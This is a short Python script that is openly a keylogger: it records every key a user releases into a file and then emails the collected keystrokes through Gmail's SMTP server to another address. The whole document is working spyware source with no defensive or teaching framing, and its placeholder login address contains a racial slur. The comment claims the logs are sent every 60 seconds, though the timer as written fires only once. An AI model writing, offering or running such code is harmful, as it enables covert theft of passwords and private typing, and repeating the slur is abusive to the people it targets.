import keyboard
import smtplib
from threading import Timer

def send_logs():
    # Fake logs per E-mail
    with open("keylog.txt", "r") as f:
        logs = f.read()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("nigger@gmail.com", "password")  # (Fake data)
    server.sendmail("nigger@gmail.com", "victim@example.com", logs)
    server.quit()

# Keystrokes
keyboard.on_release(lambda e: open("keylog.txt", "a").write(f"{e.name} "))
Timer(60, send_logs).start()  # Every 60 sec
